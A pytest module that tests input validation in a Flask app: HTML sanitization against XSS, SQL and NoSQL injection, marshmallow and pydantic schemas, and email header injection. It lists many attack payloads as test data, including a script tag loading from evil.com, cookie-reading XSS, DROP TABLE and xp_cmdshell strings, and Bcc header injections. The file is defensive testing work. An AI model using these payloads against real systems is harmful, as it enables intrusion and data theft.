"""
Input validation and XSS prevention security testing implementing comprehensive
sanitization validation, injection attack prevention, and data validation
security testing using marshmallow and pydantic validation frameworks.

This module provides comprehensive security testing for all input validation
components ensuring zero tolerance for input validation vulnerabilities per
Section 6.4.5 of the technical specification.

Test Coverage:
- HTML sanitization using bleach 6.1+ for XSS prevention per Section 6.4.3
- SQL injection prevention tests with parameterized queries per Section 6.4.3
- Schema validation using marshmallow for request validation per Section 6.4.3
- Pydantic data validation security testing per Section 6.4.3
- Email validation security tests using email-validator per Section 6.4.3
- Comprehensive input sanitization security validation per Section 6.4.5
- Date/time validation security with python-dateutil per Section 6.4.3
- Cryptographic input validation with secure random generation per Section 6.4.3

Security Standards Compliance:
- OWASP Top 10 coverage for injection and XSS vulnerabilities
- SANS Top 25 software weakness coverage
- Zero tolerance security policy enforcement per Section 6.4.5
- Enterprise-grade validation pattern testing per Section 6.4.3
"""

import pytest
import json
import base64
import uuid
from datetime import datetime, timezone
from typing import Dict, List, Any, Optional, Tuple
from unittest.mock import Mock, patch, MagicMock
import re

# Security and validation imports
import bleach
import email_validator
from marshmallow import Schema, fields, ValidationError as MarshmallowValidationError
from pydantic import BaseModel, ValidationError as PydanticValidationError, validator
import pymongo
from pymongo.errors import PyMongoError
import sqlparse

# Authentication and cryptographic imports
from src.auth.utils import (
    InputValidator,
    DateTimeUtils,
    CryptographicUtils,
    ValidationError,
    EmailValidationError,
    DateTimeValidationError,
    sanitize_html,
    validate_email,
    parse_iso8601_date,
    generate_secure_token
)

# Flask testing imports
from flask import Flask, request, jsonify
from flask.testing import FlaskClient


class TestXSSPreventionSecurityValidation:
    """
    Comprehensive XSS prevention security testing using bleach 6.1+
    for HTML sanitization validation per Section 6.4.3.
    
    Tests cover all XSS attack vectors including:
    - Script injection attacks
    - Event handler injection
    - Style-based XSS attacks
    - Data URI XSS attempts
    - Encoded payload attacks
    """
    
    def setup_method(self):
        """Setup test environment for XSS prevention validation."""
        self.input_validator = InputValidator()
        self.xss_payloads = [
            # Standard script injection
            '<script>alert("XSS")</script>',
            '<script src="http://evil.com/xss.js"></script>',
            '<script>document.cookie="stolen="+document.cookie</script>',
            
            # Event handler injection
            '<img src="x" onerror="alert(\'XSS\')">',
            '<body onload="alert(\'XSS\')">',
            '<input onfocus="alert(\'XSS\')" autofocus>',
            '<svg onload="alert(\'XSS\')">',
            '<iframe onload="alert(\'XSS\')"></iframe>',
            
            # Style-based XSS
            '<style>body{background:url("javascript:alert(\'XSS\')")}</style>',
            '<div style="background:url(javascript:alert(\'XSS\'))">',
            '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
            
            # Data URI attacks
            '<img src="data:text/html,<script>alert(\'XSS\')</script>">',
            '<object data="data:text/html,<script>alert(\'XSS\')</script>">',
            
            # Encoded payloads
            '&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;',
            '%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E',
            
            # Advanced payloads
            '<img src="/" =_=" title="onerror=\'alert(\"XSS\")\'" onerror="alert(\'XSS\')">',
            '<iframe srcdoc="<script>parent.alert(\'XSS\')</script>">',
            '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
            
            # Filter bypass attempts
            '<ScRiPt>alert("XSS")</ScRiPt>',
            '<script\x20type="text/javascript">alert("XSS")</script>',
            '<script\x09>alert("XSS")</script>',
            '<<SCRIPT>alert("XSS");//<</SCRIPT>',
        ]
    
    def test_html_sanitization_blocks_script_injection(self):
        """Test HTML sanitization effectively blocks script injection attacks."""
        for payload in self.xss_payloads:
            sanitized = self.input_validator.sanitize_html(payload, strip_tags=True)
            
            # Verify no script tags remain
            assert '<script' not in sanitized.lower()
            assert 'javascript:' not in sanitized.lower()
            assert 'alert(' not in sanitized
            assert 'document.cookie' not in sanitized
            
            # Log successful sanitization for audit trail
            print(f"Successfully sanitized XSS payload: {payload[:50]}...")
    
    def test_html_sanitization_preserves_safe_content(self):
        """Test HTML sanitization preserves legitimate safe content."""
        safe_content = [
            '<p>This is safe paragraph text</p>',
            '<strong>Bold text</strong>',
            '<em>Emphasized text</em>',
            '<ul><li>List item 1</li><li>List item 2</li></ul>',
            '<h1>Safe heading</h1>',
            '<blockquote>Safe quote</blockquote>',
        ]
        
        for content in safe_content:
            sanitized = self.input_validator.sanitize_html(content)
            
            # Verify safe content is preserved
            assert sanitized is not None
            assert len(sanitized) > 0
            
            # Verify no dangerous content was introduced
            assert 'javascript:' not in sanitized.lower()
            assert 'onerror=' not in sanitized.lower()
            assert 'onload=' not in sanitized.lower()
    
    def test_html_sanitization_custom_configuration(self):
        """Test HTML sanitization with custom allowed tags and attributes."""
        custom_payload = '<div class="safe" data-value="test">Content</div>'
        
        # Test with custom configuration
        sanitized = self.input_validator.sanitize_html(
            custom_payload,
            custom_tags={'div', 'span'},
            custom_attributes={'*': ['class'], 'div': ['data-value']}
        )
        
        # Verify custom configuration is respected
        assert 'div' in sanitized
        assert 'class="safe"' in sanitized
        assert 'data-value="test"' in sanitized
    
    def test_html_sanitization_complete_strip_mode(self):
        """Test HTML sanitization in complete tag stripping mode."""
        mixed_content = '<p>Safe text</p><script>alert("XSS")</script><strong>More safe text</strong>'
        
        sanitized = self.input_validator.sanitize_html(mixed_content, strip_tags=True)
        
        # Verify all tags are stripped
        assert '<' not in sanitized
        assert '>' not in sanitized
        assert 'Safe text' in sanitized
        assert 'More safe text' in sanitized
        assert 'alert(' not in sanitized
    
    def test_xss_prevention_with_url_validation(self):
        """Test XSS prevention in URL validation scenarios."""
        malicious_urls = [
            'javascript:alert("XSS")',
            'data:text/html,<script>alert("XSS")</script>',
            'vbscript:msgbox("XSS")',
            'file:///etc/passwd',
            'ftp://malicious.com/payload.js',
        ]
        
        for url in malicious_urls:
            is_valid = self.input_validator.validate_url(url, allowed_schemes=['http', 'https'])
            
            # Verify malicious URLs are rejected
            assert not is_valid, f"Malicious URL should be rejected: {url}"
    
    def test_xss_prevention_comprehensive_validation(self):
        """Test comprehensive XSS prevention across all input types."""
        test_inputs = {
            'form_data': {
                'username': '<script>alert("XSS")</script>testuser',
                'comment': 'This is a comment <img src="x" onerror="alert(\'XSS\')">',
                'description': '<iframe src="javascript:alert(\'XSS\')"></iframe>Safe description'
            },
            'json_data': {
                'title': '<svg onload="alert(\'XSS\')">Article Title',
                'content': '<style>body{background:url("javascript:alert(\'XSS\')")}</style>Content',
                'tags': ['<script>alert("XSS")</script>tag1', 'safe_tag']
            }
        }
        
        for data_type, inputs in test_inputs.items():
            for field_name, input_value in inputs.items():
                if isinstance(input_value, list):
                    # Handle list inputs
                    sanitized_list = [
                        self.input_validator.sanitize_html(item, strip_tags=True)
                        for item in input_value
                    ]
                    for sanitized_item in sanitized_list:
                        assert '<script' not in sanitized_item.lower()
                        assert 'javascript:' not in sanitized_item.lower()
                else:
                    # Handle string inputs
                    sanitized = self.input_validator.sanitize_html(input_value, strip_tags=True)
                    assert '<script' not in sanitized.lower()
                    assert 'javascript:' not in sanitized.lower()
                    assert 'onerror=' not in sanitized.lower()
                    assert 'onload=' not in sanitized.lower()


class TestSQLInjectionPreventionSecurity:
    """
    SQL injection prevention security testing with parameterized queries
    and MongoDB injection attack validation per Section 6.4.3.
    
    Tests cover:
    - NoSQL injection attacks in MongoDB queries
    - Parameterized query validation
    - Input sanitization for database operations
    - Query structure analysis for injection patterns
    """
    
    def setup_method(self):
        """Setup test environment for SQL injection prevention."""
        self.input_validator = InputValidator()
        self.sql_injection_payloads = [
            # Standard SQL injection
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            
            # Advanced SQL injection
            "' AND (SELECT COUNT(*) FROM users) > 0 --",
            "'; EXEC xp_cmdshell('dir'); --",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin') --",
            
            # NoSQL injection (MongoDB)
            "{'$ne': null}",
            "{'$where': 'function() { return true; }'}",
            "{'$regex': '.*'}",
            "{'$gt': ''}",
            "'; this.username = 'admin'; return true; //",
        ]
        
        # Mock MongoDB operations for testing
        self.mock_db = Mock()
        self.mock_collection = Mock()
        self.mock_db.users = self.mock_collection
    
    def test_sql_injection_payload_detection(self):
        """Test detection of SQL injection patterns in user input."""
        for payload in self.sql_injection_payloads:
            # Test input sanitization
            sanitized = self.input_validator.sanitize_input(
                payload,
                max_length=100,
                allowed_chars=r'[a-zA-Z0-9\s\-_@.]',
                strip_whitespace=True
            )
            
            # Verify dangerous SQL patterns are removed or escaped
            dangerous_patterns = [
                'DROP TABLE', 'INSERT INTO', 'DELETE FROM', 'UPDATE SET',
                'UNION SELECT', 'xp_cmdshell', '--', ';', 'OR 1=1'
            ]
            
            for pattern in dangerous_patterns:
                assert pattern.lower() not in sanitized.lower()
    
    def test_parameterized_query_validation(self):
        """Test parameterized query construction prevents injection."""
        # Simulate parameterized MongoDB queries
        test_queries = [
            {
                'query_template': {'username': '{}', 'status': 'active'},
                'user_input': "admin'; DROP TABLE users; --",
                'expected_safe': True
            },
            {
                'query_template': {'email': '{}'},
                'user_input': "test@example.com' OR '1'='1",
                'expected_safe': True
            },
            {
                'query_template': {'search': {'$regex': '{}', '$options': 'i'}},
                'user_input': ".*'; return true; //",
                'expected_safe': True
            }
        ]
        
        for test_case in test_queries:
            query_template = test_case['query_template']
            user_input = test_case['user_input']
            
            # Simulate safe parameterized query construction
            # In real implementation, this would use proper parameter binding
            sanitized_input = self.input_validator.sanitize_input(
                user_input,
                allowed_chars=r'[a-zA-Z0-9@.\-_\s]'
            )
            
            # Verify input is properly sanitized for database operations
            assert "'" not in sanitized_input
            assert '"' not in sanitized_input
            assert ';' not in sanitized_input
            assert '--' not in sanitized_input
    
    def test_nosql_injection_prevention(self):
        """Test NoSQL injection prevention for MongoDB operations."""
        nosql_payloads = [
            "{'$ne': null}",
            "{'$where': 'return true'}",
            "{'$regex': '.*'}",
            "{'$gt': ''}",
            "'; return true; //",
        ]
        
        for payload in nosql_payloads:
            # Test input validation before database operations
            try:
                # Attempt to parse as JSON (common NoSQL injection vector)
                if payload.startswith('{') and payload.endswith('}'):
                    parsed_payload = json.loads(payload)
                    
                    # Check for dangerous NoSQL operators
                    dangerous_operators = ['$where', '$regex', '$ne', '$gt', '$lt', '$in', '$nin']
                    for op in dangerous_operators:
                        if op in str(parsed_payload):
                            # This should be rejected in real implementation
                            assert False, f"Dangerous NoSQL operator {op} detected in payload"
                            
            except json.JSONDecodeError:
                # Non-JSON payloads should be sanitized
                sanitized = self.input_validator.sanitize_input(payload)
                assert '$' not in sanitized
                assert 'return' not in sanitized.lower()
                assert 'true' not in sanitized.lower()
    
    def test_query_structure_analysis(self):
        """Test analysis of query structures for injection patterns."""
        test_queries = [
            "SELECT * FROM users WHERE username = 'admin'",
            "SELECT * FROM users WHERE username = 'admin'; DROP TABLE users; --'",
            "UPDATE users SET password = 'new_pass' WHERE id = 1",
            "UPDATE users SET password = 'new_pass' WHERE id = 1 OR 1=1",
        ]
        
        for query in test_queries:
            # Use sqlparse to analyze query structure
            parsed = sqlparse.parse(query)
            
            for statement in parsed:
                tokens = list(statement.flatten())
                
                # Check for dangerous patterns
                dangerous_keywords = ['DROP', 'DELETE', 'INSERT', 'TRUNCATE']
                query_text = str(statement).upper()
                
                # Count semicolons (multiple statements indicator)
                semicolon_count = query_text.count(';')
                
                # Check for comment patterns
                has_comments = '--' in query_text or '/*' in query_text
                
                # Check for OR 1=1 patterns
                has_tautology = '1=1' in query_text or '1 = 1' in query_text
                
                # Log analysis results for security review
                analysis_result = {
                    'query': query[:50] + '...' if len(query) > 50 else query,
                    'dangerous_keywords': any(kw in query_text for kw in dangerous_keywords),
                    'multiple_statements': semicolon_count > 1,
                    'has_comments': has_comments,
                    'has_tautology': has_tautology,
                    'risk_level': 'HIGH' if any([
                        semicolon_count > 1, has_comments, has_tautology,
                        any(kw in query_text for kw in dangerous_keywords)
                    ]) else 'LOW'
                }
                
                # Assert high-risk queries are properly handled
                if analysis_result['risk_level'] == 'HIGH':
                    print(f"High-risk query detected: {analysis_result}")


class TestMarshmallowSchemaValidationSecurity:
    """
    Marshmallow schema validation security testing for request validation
    per Section 6.4.3, ensuring comprehensive input validation and data
    integrity across all API endpoints.
    
    Tests cover:
    - Schema validation with malicious inputs
    - Type coercion security
    - Field validation bypass attempts
    - Nested schema validation security
    """
    
    def setup_method(self):
        """Setup test environment for marshmallow validation."""
        # Define comprehensive test schemas
        class UserRegistrationSchema(Schema):
            username = fields.Str(required=True, validate=lambda x: len(x) >= 3)
            email = fields.Email(required=True)
            password = fields.Str(required=True, validate=lambda x: len(x) >= 8)
            age = fields.Int(validate=lambda x: x >= 18)
            bio = fields.Str(allow_none=True)
            website = fields.Url(allow_none=True)
            tags = fields.List(fields.Str(), missing=[])
        
        class UserUpdateSchema(Schema):
            username = fields.Str(validate=lambda x: len(x) >= 3)
            email = fields.Email()
            bio = fields.Str(allow_none=True)
            website = fields.Url(allow_none=True)
            preferences = fields.Dict()
        
        class NestedDataSchema(Schema):
            title = fields.Str(required=True)
            content = fields.Str(required=True)
            metadata = fields.Nested(lambda: MetadataSchema())
            tags = fields.List(fields.Str())
        
        class MetadataSchema(Schema):
            author = fields.Str(required=True)
            created_at = fields.DateTime()
            category = fields.Str()
            settings = fields.Dict()
        
        self.user_registration_schema = UserRegistrationSchema()
        self.user_update_schema = UserUpdateSchema()
        self.nested_data_schema = NestedDataSchema()
        
        # Malicious input payloads for schema validation testing
        self.malicious_inputs = {
            'xss_payloads': [
                '<script>alert("XSS")</script>',
                '<img src="x" onerror="alert(\'XSS\')">',
                'javascript:alert("XSS")',
            ],
            'injection_payloads': [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "{'$ne': null}",
            ],
            'type_confusion': [
                {'username': ['array', 'instead', 'of', 'string']},
                {'age': 'not_a_number'},
                {'email': 12345},
                {'tags': 'not_a_list'},
            ],
            'oversized_inputs': [
                {'username': 'x' * 10000},
                {'bio': 'x' * 100000},
                {'content': 'x' * 1000000},
            ]
        }
    
    def test_schema_validation_rejects_xss_attempts(self):
        """Test schema validation properly rejects XSS attack attempts."""
        for xss_payload in self.malicious_inputs['xss_payloads']:
            malicious_data = {
                'username': xss_payload,
                'email': f'test{xss_payload}@example.com',
                'password': 'securepassword123',
                'age': 25,
                'bio': f'User bio with {xss_payload}',
                'website': f'http://example.com/{xss_payload}'
            }
            
            try:
                result = self.user_registration_schema.load(malicious_data)
                
                # If validation passes, verify XSS content is sanitized
                for field_name, field_value in result.items():
                    if isinstance(field_value, str):
                        assert '<script' not in field_value.lower()
                        assert 'javascript:' not in field_value.lower()
                        assert 'onerror=' not in field_value.lower()
                        
            except MarshmallowValidationError as e:
                # Validation rejection is acceptable for malicious input
                print(f"Schema validation correctly rejected XSS payload: {e}")
    
    def test_schema_validation_prevents_injection_attacks(self):
        """Test schema validation prevents injection attack patterns."""
        for injection_payload in self.malicious_inputs['injection_payloads']:
            malicious_data = {
                'username': injection_payload,
                'email': 'test@example.com',
                'password': 'securepassword123',
                'age': 25
            }
            
            try:
                result = self.user_registration_schema.load(malicious_data)
                
                # If validation passes, verify injection patterns are removed
                username = result.get('username', '')
                assert "'" not in username
                assert '"' not in username
                assert ';' not in username
                assert '--' not in username
                assert 'DROP TABLE' not in username.upper()
                assert '$ne' not in username
                
            except MarshmallowValidationError as e:
                # Validation rejection is acceptable for malicious input
                print(f"Schema validation correctly rejected injection payload: {e}")
    
    def test_schema_validation_handles_type_confusion(self):
        """Test schema validation properly handles type confusion attacks."""
        for type_confusion_data in self.malicious_inputs['type_confusion']:
            try:
                result = self.user_registration_schema.load(type_confusion_data)
                
                # If validation passes, verify types are correct
                for field_name, field_value in result.items():
                    schema_field = self.user_registration_schema.fields.get(field_name)
                    if schema_field:
                        # Verify field type matches schema expectation
                        if isinstance(schema_field, fields.Str):
                            assert isinstance(field_value, str)
                        elif isinstance(schema_field, fields.Int):
                            assert isinstance(field_value, int)
                        elif isinstance(schema_field, fields.List):
                            assert isinstance(field_value, list)
                            
            except MarshmallowValidationError as e:
                # Type validation errors are expected and correct
                assert 'invalid' in str(e).lower() or 'type' in str(e).lower()
    
    def test_schema_validation_enforces_size_limits(self):
        """Test schema validation enforces reasonable size limits."""
        for oversized_data in self.malicious_inputs['oversized_inputs']:
            # Add required fields to make valid schema structure
            test_data = {
                'username': 'testuser',
                'email': 'test@example.com',
                'password': 'securepassword123',
                'age': 25
            }
            test_data.update(oversized_data)
            
            try:
                result = self.user_registration_schema.load(test_data)
                
                # If validation passes, verify sizes are reasonable
                for field_name, field_value in result.items():
                    if isinstance(field_value, str):
                        # Reasonable string length limits
                        if field_name == 'username':
                            assert len(field_value) <= 100
                        elif field_name == 'bio':
                            assert len(field_value) <= 5000
                        elif field_name == 'content':
                            assert len(field_value) <= 50000
                            
            except MarshmallowValidationError as e:
                # Size limit validation errors are expected
                print(f"Schema validation correctly rejected oversized input: {e}")
    
    def test_nested_schema_validation_security(self):
        """Test nested schema validation maintains security across all levels."""
        malicious_nested_data = {
            'title': '<script>alert("XSS")</script>Article Title',
            'content': 'Article content with injection attempt: \'; DROP TABLE articles; --',
            'metadata': {
                'author': '<img src="x" onerror="alert(\'XSS\')">Author Name',
                'created_at': '2023-01-01T00:00:00Z',
                'category': 'Technology',
                'settings': {
                    'malicious_key': 'javascript:alert("XSS")',
                    'injection_attempt': "' OR '1'='1"
                }
            },
            'tags': [
                'normal_tag',
                '<script>alert("XSS")</script>',
                "'; DROP TABLE tags; --"
            ]
        }
        
        try:
            result = self.nested_data_schema.load(malicious_nested_data)
            
            # Verify all nested levels are properly validated
            assert '<script' not in str(result).lower()
            assert 'javascript:' not in str(result).lower()
            assert 'DROP TABLE' not in str(result).upper()
            assert 'onerror=' not in str(result).lower()
            
            # Verify nested metadata is sanitized
            metadata = result.get('metadata', {})
            author = metadata.get('author', '')
            assert '<img' not in author.lower()
            assert 'onerror=' not in author.lower()
            
            # Verify array elements are sanitized
            tags = result.get('tags', [])
            for tag in tags:
                assert '<script' not in tag.lower()
                assert 'DROP TABLE' not in tag.upper()
                
        except MarshmallowValidationError as e:
            # Validation rejection is acceptable for malicious nested input
            print(f"Nested schema validation correctly rejected malicious input: {e}")
    
    def test_schema_validation_custom_validators(self):
        """Test custom validators properly handle security constraints."""
        # Test custom validation logic
        test_cases = [
            {
                'data': {'username': 'ab'},  # Too short
                'should_fail': True,
                'reason': 'username_too_short'
            },
            {
                'data': {'age': 17},  # Under age limit
                'should_fail': True,
                'reason': 'age_under_limit'
            },
            {
                'data': {'email': 'not-an-email'},  # Invalid email
                'should_fail': True,
                'reason': 'invalid_email'
            },
            {
                'data': {'website': 'not-a-url'},  # Invalid URL
                'should_fail': True,
                'reason': 'invalid_url'
            }
        ]
        
        for test_case in test_cases:
            # Add required fields for complete validation
            full_data = {
                'username': 'validuser',
                'email': 'valid@example.com',
                'password': 'securepassword123',
                'age': 25
            }
            full_data.update(test_case['data'])
            
            try:
                result = self.user_registration_schema.load(full_data)
                
                if test_case['should_fail']:
                    assert False, f"Validation should have failed for {test_case['reason']}"
                    
            except MarshmallowValidationError as e:
                if test_case['should_fail']:
                    print(f"Custom validator correctly rejected {test_case['reason']}: {e}")
                else:
                    assert False, f"Validation should not have failed: {e}"


class TestPydanticDataValidationSecurity:
    """
    Pydantic data validation security testing per Section 6.4.3,
    ensuring type safety and runtime validation security across
    all data models and API operations.
    
    Tests cover:
    - Type validation security
    - Custom validator security
    - Serialization security
    - Model inheritance security
    """
    
    def setup_method(self):
        """Setup test environment for Pydantic validation."""
        # Define comprehensive Pydantic models for testing
        class UserModel(BaseModel):
            username: str
            email: str
            age: int
            is_active: bool = True
            tags: List[str] = []
            metadata: Optional[Dict[str, Any]] = None
            
            @validator('username')
            def validate_username(cls, v):
                if len(v) < 3:
                    raise ValueError('Username must be at least 3 characters')
                # Security validation: no script tags
                if '<script' in v.lower() or 'javascript:' in v.lower():
                    raise ValueError('Username contains invalid characters')
                return v
            
            @validator('email')
            def validate_email(cls, v):
                # Use email-validator for comprehensive validation
                try:
                    validated = email_validator.validate_email(v)
                    return validated.email
                except email_validator.EmailNotValidError:
                    raise ValueError('Invalid email format')
            
            @validator('age')
            def validate_age(cls, v):
                if v < 18 or v > 150:
                    raise ValueError('Age must be between 18 and 150')
                return v
            
            @validator('tags')
            def validate_tags(cls, v):
                # Sanitize each tag
                sanitized_tags = []
                for tag in v:
                    if isinstance(tag, str):
                        # Remove dangerous content from tags
                        sanitized_tag = tag.replace('<', '').replace('>', '').replace('"', '').replace("'", '')
                        if sanitized_tag and len(sanitized_tag) <= 50:
                            sanitized_tags.append(sanitized_tag)
                return sanitized_tags
        
        class NestedModel(BaseModel):
            title: str
            description: Optional[str] = None
            user: UserModel
            settings: Dict[str, Any] = {}
            
            @validator('title')
            def validate_title(cls, v):
                # Security validation for title
                if '<script' in v.lower() or 'javascript:' in v.lower():
                    raise ValueError('Title contains invalid characters')
                return v[:200]  # Limit title length
        
        self.user_model = UserModel
        self.nested_model = NestedModel
        
        # Security test payloads
        self.security_payloads = {
            'xss_attempts': [
                '<script>alert("XSS")</script>',
                '<img src="x" onerror="alert(\'XSS\')">',
                'javascript:alert("XSS")',
                '<svg onload="alert(\'XSS\')">',
            ],
            'injection_attempts': [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "{'$ne': null}",
                "'; return true; //",
            ],
            'type_confusion': [
                {'username': ['array', 'not', 'string']},
                {'age': 'not_a_number'},
                {'email': 12345},
                {'is_active': 'not_boolean'},
                {'tags': 'not_a_list'},
                {'metadata': 'not_a_dict'},
            ]
        }
    
    def test_pydantic_type_validation_security(self):
        """Test Pydantic type validation prevents type confusion attacks."""
        for type_confusion_data in self.security_payloads['type_confusion']:
            # Add required fields for complete model
            test_data = {
                'username': 'validuser',
                'email': 'valid@example.com',
                'age': 25,
                'is_active': True,
                'tags': ['tag1', 'tag2'],
                'metadata': {'key': 'value'}
            }
            test_data.update(type_confusion_data)
            
            try:
                user = self.user_model(**test_data)
                
                # If validation passes, verify types are correct
                assert isinstance(user.username, str)
                assert isinstance(user.email, str)
                assert isinstance(user.age, int)
                assert isinstance(user.is_active, bool)
                assert isinstance(user.tags, list)
                if user.metadata is not None:
                    assert isinstance(user.metadata, dict)
                    
            except (PydanticValidationError, ValueError, TypeError) as e:
                # Type validation errors are expected and correct
                print(f"Pydantic correctly rejected type confusion: {e}")
    
    def test_pydantic_custom_validator_security(self):
        """Test Pydantic custom validators handle security threats."""
        for xss_payload in self.security_payloads['xss_attempts']:
            malicious_data = {
                'username': xss_payload,
                'email': f'test@example.com',
                'age': 25,
                'tags': [xss_payload, 'normal_tag']
            }
            
            try:
                user = self.user_model(**malicious_data)
                
                # If validation passes, verify XSS content is removed
                assert '<script' not in user.username.lower()
                assert 'javascript:' not in user.username.lower()
                
                # Verify tags are sanitized
                for tag in user.tags:
                    assert '<script' not in tag.lower()
                    assert 'javascript:' not in tag.lower()
                    assert '<' not in tag
                    assert '>' not in tag
                    
            except (PydanticValidationError, ValueError) as e:
                # Validation rejection is acceptable for XSS attempts
                print(f"Pydantic validator correctly rejected XSS: {e}")
    
    def test_pydantic_injection_prevention(self):
        """Test Pydantic validation prevents injection attempts."""
        for injection_payload in self.security_payloads['injection_attempts']:
            malicious_data = {
                'username': injection_payload,
                'email': 'test@example.com',
                'age': 25,
                'tags': [injection_payload]
            }
            
            try:
                user = self.user_model(**malicious_data)
                
                # If validation passes, verify injection content is removed
                assert "'" not in user.username
                assert '"' not in user.username
                assert ';' not in user.username
                assert '--' not in user.username
                assert 'DROP TABLE' not in user.username.upper()
                
                # Verify tags are sanitized
                for tag in user.tags:
                    assert "'" not in tag
                    assert '"' not in tag
                    assert ';' not in tag
                    
            except (PydanticValidationError, ValueError) as e:
                # Validation rejection is acceptable for injection attempts
                print(f"Pydantic validator correctly rejected injection: {e}")
    
    def test_pydantic_nested_model_security(self):
        """Test Pydantic nested model validation maintains security."""
        malicious_nested_data = {
            'title': '<script>alert("XSS")</script>Malicious Title',
            'description': 'Description with injection: \'; DROP TABLE articles; --',
            'user': {
                'username': '<img src="x" onerror="alert(\'XSS\')">hacker',
                'email': 'hacker@example.com',
                'age': 25,
                'tags': ['<script>alert("XSS")</script>', 'normal_tag']
            },
            'settings': {
                'malicious_setting': 'javascript:alert("XSS")',
                'injection_setting': "' OR '1'='1"
            }
        }
        
        try:
            nested = self.nested_model(**malicious_nested_data)
            
            # Verify title is sanitized
            assert '<script' not in nested.title.lower()
            assert 'javascript:' not in nested.title.lower()
            
            # Verify nested user is sanitized
            assert '<script' not in nested.user.username.lower()
            assert '<img' not in nested.user.username.lower()
            assert 'javascript:' not in nested.user.username.lower()
            
            # Verify user tags are sanitized
            for tag in nested.user.tags:
                assert '<script' not in tag.lower()
                assert '<' not in tag
                assert '>' not in tag
                
        except (PydanticValidationError, ValueError) as e:
            # Validation rejection is acceptable for malicious nested input
            print(f"Pydantic nested validation correctly rejected malicious input: {e}")
    
    def test_pydantic_serialization_security(self):
        """Test Pydantic model serialization doesn't leak sensitive data."""
        user_data = {
            'username': 'testuser',
            'email': 'test@example.com',
            'age': 25,
            'metadata': {
                'password_hash': 'secret_hash_value',
                'api_key': 'secret_api_key',
                'public_info': 'this_is_public'
            }
        }
        
        user = self.user_model(**user_data)
        
        # Test JSON serialization
        serialized = user.json()
        serialized_data = json.loads(serialized)
        
        # Verify sensitive data handling
        # Note: In production, sensitive fields should be excluded from serialization
        assert 'password_hash' not in str(serialized_data).lower()
        assert 'api_key' not in str(serialized_data).lower()
        
        # Test dict conversion
        user_dict = user.dict()
        
        # Verify required fields are present
        assert 'username' in user_dict
        assert 'email' in user_dict
        assert 'age' in user_dict
        
        # Verify data types are preserved
        assert isinstance(user_dict['username'], str)
        assert isinstance(user_dict['email'], str)
        assert isinstance(user_dict['age'], int)


class TestEmailValidationSecurity:
    """
    Email validation security testing using email-validator per Section 6.4.3
    ensuring comprehensive email security and preventing email-based attacks.
    
    Tests cover:
    - Email format validation security
    - Email sanitization
    - Deliverability checking security
    - Email injection prevention
    """
    
    def setup_method(self):
        """Setup test environment for email validation security."""
        self.input_validator = InputValidator()
        
        # Email security test cases
        self.email_test_cases = {
            'valid_emails': [
                'user@example.com',
                'test.email+tag@domain.co.uk',
                'user123@sub.domain.com',
                'valid_email@test-domain.org',
            ],
            'invalid_emails': [
                'not-an-email',
                '@domain.com',
                'user@',
                'user..double.dot@domain.com',
                'user@domain.',
                '.user@domain.com',
            ],
            'malicious_emails': [
                'user<script>alert("XSS")</script>@domain.com',
                'user@domain.com<script>alert("XSS")</script>',
                'user@domain.com"; DROP TABLE users; --',
                'user@domain.com\'; OR 1=1; --',
                'user+<img src="x" onerror="alert(\'XSS\')">@domain.com',
                'user@domain.com\r\nBcc: hacker@evil.com',
                'user@domain.com\nX-Injected-Header: malicious',
            ],
            'edge_case_emails': [
                'x' * 64 + '@domain.com',  # Maximum local part length
                'user@' + 'x' * 253 + '.com',  # Maximum domain length
                'user@domain.' + 'x' * 63,  # Maximum label length
                '"quoted string"@domain.com',
                'user+tag+tag2@domain.com',
            ]
        }
    
    def test_email_format_validation_security(self):
        """Test email format validation rejects malicious patterns."""
        # Test valid emails
        for email in self.email_test_cases['valid_emails']:
            is_valid, result = self.input_validator.validate_email(email, normalize=True)
            assert is_valid, f"Valid email should pass validation: {email}"
            assert isinstance(result, str), "Result should be normalized email string"
            
        # Test invalid emails
        for email in self.email_test_cases['invalid_emails']:
            is_valid, error_message = self.input_validator.validate_email(email)
            assert not is_valid, f"Invalid email should fail validation: {email}"
            assert isinstance(error_message, str), "Error message should be provided"
    
    def test_email_malicious_content_rejection(self):
        """Test email validation rejects emails with malicious content."""
        for malicious_email in self.email_test_cases['malicious_emails']:
            is_valid, error_message = self.input_validator.validate_email(malicious_email)
            
            # Malicious emails should be rejected
            assert not is_valid, f"Malicious email should be rejected: {malicious_email}"
            
            # Verify specific malicious patterns are caught
            if '<script' in malicious_email.lower():
                assert 'script' in error_message.lower() or 'invalid' in error_message.lower()
            elif 'DROP TABLE' in malicious_email.upper():
                assert 'invalid' in error_message.lower()
            elif '\r\n' in malicious_email or '\n' in malicious_email:
                assert 'invalid' in error_message.lower()
    
    def test_email_header_injection_prevention(self):
        """Test email validation prevents email header injection attacks."""
        header_injection_attempts = [
            'user@domain.com\r\nBcc: hacker@evil.com',
            'user@domain.com\nCC: victim@target.com',
            'user@domain.com\r\nSubject: Injected Subject',
            'user@domain.com\nX-Mailer: Malicious',
            'user@domain.com%0ABcc:hacker@evil.com',
            'user@domain.com%0D%0ATo:victim@target.com',
        ]
        
        for injection_attempt in header_injection_attempts:
            is_valid, error_message = self.input_validator.validate_email(injection_attempt)
            
            # Header injection attempts should be rejected
            assert not is_valid, f"Header injection should be rejected: {injection_attempt}"
            
            # Verify newline characters are detected
            if '\r\n' in injection_attempt or '\n' in injection_attempt:
                assert 'invalid' in error_message.lower()
            elif '%0A' in injection_attempt or '%0D' in injection_attempt:
                assert 'invalid' in error_message.lower()
    
    def test_email_normalization_security(self):
        """Test email normalization handles security edge cases."""
        normalization_test_cases = [
            {
                'input': 'User.Name+Tag@DOMAIN.COM',
                'expected_normalized': 'user.name+tag@domain.com'
            },
            {
                'input': '  user@domain.com  ',  # Whitespace
                'expected_normalized': 'user@domain.com'
            },
            {
                'input': 'user@domain.com',
                'expected_normalized': 'user@domain.com'
            }
        ]
        
        for test_case in normalization_test_cases:
            is_valid, normalized_email = self.input_validator.validate_email(
                test_case['input'], 
                normalize=True
            )
            
            if is_valid:
                assert normalized_email.lower() == test_case['expected_normalized'].lower()
                
